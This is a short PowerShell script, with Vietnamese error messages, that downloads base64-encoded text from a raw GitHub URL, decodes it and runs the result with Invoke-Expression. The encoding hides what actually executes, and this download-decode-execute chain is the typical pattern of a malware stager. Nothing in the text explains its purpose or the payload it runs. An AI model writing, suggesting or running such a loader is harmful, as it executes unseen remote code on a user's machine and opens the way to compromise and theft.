$url = "https://raw.githubusercontent.com/zh13uu/mini-meo-where/main/meowhere.txt"

try {
    $base64Content = Invoke-RestMethod -Uri $url -ErrorAction Stop

    if (-not $base64Content) {
        throw "Nội dung tải về từ URL bị rỗng."
    }

    $bytes = [System.Convert]::FromBase64String($base64Content)

    $decodedScript = [System.Text.Encoding]::UTF8.GetString($bytes)

    Invoke-Expression $decodedScript

} catch {
    Write-Error "Lỗi thực thi script từ URL: $($_.Exception.Message)"
}
